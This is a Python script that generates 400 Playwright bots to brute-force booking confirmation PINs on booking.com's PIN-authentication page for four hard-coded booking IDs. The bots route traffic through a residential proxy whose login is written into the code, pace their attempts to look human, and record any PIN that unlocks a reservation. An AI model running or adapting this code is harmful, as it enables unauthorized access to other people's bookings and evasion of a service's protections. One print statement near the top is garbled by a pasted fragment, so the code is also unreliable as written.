import os
from colorama import init, Fore, Style
init()

print(f"{Fore.CYAN}🚀 SYNCHRONIZED BATCH REGENERATOR 🚀{Style.RESET_ALL}")
print(f"{Fore.YELLOW}Recreating ALL batches with synchronized PIN testing{Style.RESET_ALL}")
print(f        print(f"{Fore.GREEN}✅ Created: agent_{agent_id}.py (PINs: {', '.join(pin_list)}){Style.RESET_ALL}"){Fore.MAGENTA}Strategy: Same agent numbers = Same PINs across all booking IDs{Style.RESET_ALL}")
print(f"{Fore.GREEN}Example: 1A, 1B, 1C, 1D all test PINs 1000-1004{Style.RESET_ALL}")
print(f"{Fore.RED}🎯 BEGINNING SYNCHRONIZED ARMY CREATION!{Style.RESET_ALL}")

# Batch configurations
batches = {
    'A': {'booking_id': '5830944764', 'letter': 'A'},
    'B': {'booking_id': '6160911170', 'letter': 'B'}, 
    'C': {'booking_id': '6860261353', 'letter': 'C'},
    'D': {'booking_id': '6339614781', 'letter': 'D'}
}

print(f"{Fore.YELLOW}🗑️ Cleaning up old batch files...{Style.RESET_ALL}")
# Clean up all existing agent files
for batch_letter in ['A', 'B', 'C', 'D']:
    for i in range(1, 101):
        old_file = f"agent_{i:03d}{batch_letter}.py"
        if os.path.exists(old_file):
            os.remove(old_file)
            print(f"{Fore.RED}❌ Removed: {old_file}{Style.RESET_ALL}")

print(f"{Fore.CYAN}🎲 Creating synchronized agents...{Style.RESET_ALL}")

# Create synchronized agents
for i in range(1, 101):
    # Calculate PIN range for this agent number (same across all batches)
    start_pin = 1000 + (i - 1) * 5
    pin_list = [str(start_pin + j) for j in range(5)]
    
    print(f"{Fore.YELLOW}🔧 Creating Agent {i:03d} across all batches (PINs: {', '.join(pin_list)})...{Style.RESET_ALL}")
    
    # Create this agent for all 4 batches
    for batch_letter, batch_config in batches.items():
        agent_id = f"{i:03d}{batch_letter}"
        booking_id = batch_config['booking_id']
        
        # Generate the agent script with SYNCHRONIZED PIN LOGIC
        agent_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🎯 GHOSTFORM AGENT {agent_id}
Batch: {batch_letter} | Agent: {i}
Target: {booking_id}
PINs: {', '.join(pin_list)}
SYNCHRONIZED: Same PINs as agents {i:03d}A, {i:03d}B, {i:03d}C, {i:03d}D
"""

from playwright.sync_api import sync_playwright
import time
import json
import os
from datetime import datetime

# Agent Configuration
AGENT_ID = "{agent_id}"
BOOKING_ID = "{booking_id}"
PINS = {pin_list}
WAIT_TIME = 10  # Human-like 10 second wait between attempts

# File paths
LOG_FILE = f"agent_{{AGENT_ID}}_log.csv"
SUCCESS_FILE = f"victory_{{AGENT_ID}}.json"
SCREEN_DIR = f"screenshots_{{AGENT_ID}}"

os.makedirs(SCREEN_DIR, exist_ok=True)

def log_result(pin, result, url):
    """Log result to agent log"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(f"{{timestamp}},BATCH_{batch_letter},{{AGENT_ID}},{{BOOKING_ID}},{{pin}},{{result}},{{url}}\\n")

def log_success(pin, url):
    """Log success to dedicated success file"""
    success_data = {{
        "booking_id": BOOKING_ID,
        "success_pin": pin,
        "success_url": url,
        "agent": AGENT_ID,
        "batch": "{batch_letter}",
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }}
    with open(SUCCESS_FILE, 'w', encoding='utf-8') as f:
        json.dump(success_data, f, indent=2)

print(f"🤖 BATCH {batch_letter} AGENT {{AGENT_ID}} DEPLOYING...")
print(f"🎯 Target: {{BOOKING_ID}}")
print(f"🔑 Assigned PINs: {{PINS}}")
print(f"🔄 Synchronized with agents {i:03d}A, {i:03d}B, {i:03d}C, {i:03d}D")
print(f"🛡️ Proxy: https://us-pr.oxylabs.io:10000")

success_count = 0
fail_count = 0
unknown_count = 0
exception_count = 0

with sync_playwright() as p:
    # PROXY CONFIGURATION - STEALTH MODE ACTIVATED!
    proxy_config = {{
        "server": "https://us-pr.oxylabs.io:10000",
        "username": "customer-oxy1p_hnzsA",
        "password": "oxy1p_hnzsA1"
    }}
    print(f"🛡️ STEALTH MODE: Proxy configured - {{proxy_config['server']}}")
    
    browser = p.chromium.launch(
        headless=False,
        proxy=proxy_config
    )
    print(f"🌐 Browser launched with PROXY STEALTH!")
    page = browser.new_page()
    print("📄 New page created with stealth protection")

    for i, pin in enumerate(PINS, 1):
        print(f"🔑 Agent {{AGENT_ID}} - Testing PIN {{i}}/{{len(PINS)}}: {{pin}}")
        
        try:
            # LOGIC 1: Open browser and wait until completely loaded
            print("🌐 Opening booking.com...")
            page.goto("https://secure.booking.com/help/confirmation_pin_auth")
            print("⏳ Waiting for page to load completely...")
            page.wait_for_load_state("networkidle")  # Wait until no network activity
            print("✅ Page loaded completely!")

            # LOGIC 2: Fill booking ID and PIN, then click continue
            print("📝 Looking for booking ID field...")
            page.wait_for_selector('input[placeholder="e.g. 1234567890"]')
            print(f"📝 Filling booking ID: {{BOOKING_ID}}")
            page.fill('input[placeholder="e.g. 1234567890"]', BOOKING_ID)
            
            print(f"🔐 Filling PIN: {{pin}}")
            page.fill('input[placeholder="e.g. 1234"]', pin)
            
            print("🔍 Looking for Continue button...")
            try:
                page.wait_for_selector('button:has-text("Continue")')
                print("✅ Clicking Continue button...")
                page.click('button:has-text("Continue")')
            except:
                page.wait_for_selector('button[type="submit"]')
                print("✅ Clicking Submit button...")
                page.click('button[type="submit"]')

            # LOGIC 3: Wait for results - either error banner OR URL change
            print("⏳ Waiting for results...")
            print("⏳ Giving extra time for page to redirect...")
            time.sleep(5)  # Extra wait for redirect
            
            # Wait for either success (URL change) or error banner to appear
            try:
                page.wait_for_function("""
                    () => {{
                        // Check if URL contains success indicator
                        const urlChanged = window.location.href.includes('unique_order_id') || 
                                         window.location.href.includes('booking_details') ||
                                         window.location.href.includes('confirmation') ||
                                         window.location.href.includes('/help/reservation');
                        
                        // Check if error banner appears
                        const errorBanner = document.querySelector('.bui-alert--error') !== null ||
                                          document.querySelector('[class*="error"]') !== null ||
                                          document.querySelector('.alert-danger') !== null;
                        
                        return urlChanged || errorBanner;
                    }}
                """, timeout=20000)
            except:
                print("⚠️ No clear result after 20s, checking current state...")

            # Check results
            current_url = page.url
            print(f"🔍 Current URL: {{current_url}}")
            
            # Check for various elements on the page
            error_elements = page.query_selector_all('.bui-alert--error, [class*="error"], .alert-danger')
            
            # Check for SUCCESS: URL contains success indicators
            if ("unique_order_id" in current_url or 
                "booking_details" in current_url or 
                "/help/reservation" in current_url or
                current_url != "https://secure.booking.com/help/confirmation_pin_auth"):
                print(f"🎉 SUCCESS! PIN {{pin}} is CORRECT! (URL changed)")
                print(f"✅ Success URL: {{current_url}}")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_SUCCESS_{{AGENT_ID}}.png")
                log_result(pin, "SUCCESS", current_url)
                log_success(pin, current_url)
                success_count += 1
                print("🎉 SUCCESS FOUND! Mission accomplished!")
                break  # Stop testing, we found the PIN!
                
            # Check for FAILURE: error banner detected
            elif len(error_elements) > 0:
                print(f"❌ PIN {{pin}} is INCORRECT (error banner detected)")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_FAIL_{{AGENT_ID}}.png")
                log_result(pin, "FAILURE", current_url)
                fail_count += 1
                
            else:
                print(f"❓ Unknown result for PIN {{pin}}")
                page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_UNKNOWN_{{AGENT_ID}}.png")
                log_result(pin, "UNKNOWN", current_url)
                unknown_count += 1

        except Exception as e:
            print(f"💥 Error with PIN {{pin}}: {{e}}")
            page.screenshot(path=f"{{SCREEN_DIR}}/{{BOOKING_ID}}_{{pin}}_EXCEPTION_{{AGENT_ID}}.png")
            log_result(pin, "EXCEPTION", page.url)
            exception_count += 1

        # Human-like pause before next PIN (except for last PIN)
        if i < len(PINS):
            print(f"⏳ Human breathing... waiting {{WAIT_TIME}}s before next PIN...")
            time.sleep(WAIT_TIME)

    browser.close()
    print(f"🏠 Agent {{AGENT_ID}} mission complete")

print(f"\\n--- Agent {{AGENT_ID}} Summary ---")
print(f"Total attempts: {{len(PINS)}}")
print(f"Success: {{success_count}}")
print(f"Failure: {{fail_count}}")
print(f"Unknown: {{unknown_count}}")
print(f"Exception: {{exception_count}}")

if __name__ == "__main__":
    pass
'''
        
        # Write agent file with UTF-8 encoding
        with open(f"agent_{agent_id}.py", "w", encoding='utf-8') as f:
            f.write(agent_code)
        
        print(f"{Fore.GREEN}✅ Created: agent_{agent_id}.py (PINs: {', '.join(pin_list)}){{Style.RESET_ALL}")

print(f"{Fore.GREEN}🎉 SYNCHRONIZED ARMY CREATION COMPLETE!{Style.RESET_ALL}")
print(f"{Fore.CYAN}📂 Files Created: 400 synchronized agents{Style.RESET_ALL}")
print(f"{Fore.YELLOW}📊 Strategy: Each agent number tests same PINs across all booking IDs{Style.RESET_ALL}")
print(f"{Fore.MAGENTA}🎯 Example: 001A, 001B, 001C, 001D all test PINs 1000-1004{Style.RESET_ALL}")
print(f"{Fore.BLUE}🔄 Coverage: 1000-1499 PINs × 4 booking IDs = Total coverage{Style.RESET_ALL}")
print(f"{Fore.GREEN}✅ SYNCHRONIZED 400-AGENT ARMY READY FOR DEPLOYMENT!{Style.RESET_ALL}")
print(f"{Fore.RED}🏆 PERFECT STRATEGY: EACH PIN SET TESTED AGAINST ALL 4 BOOKING IDS!{Style.RESET_ALL}")
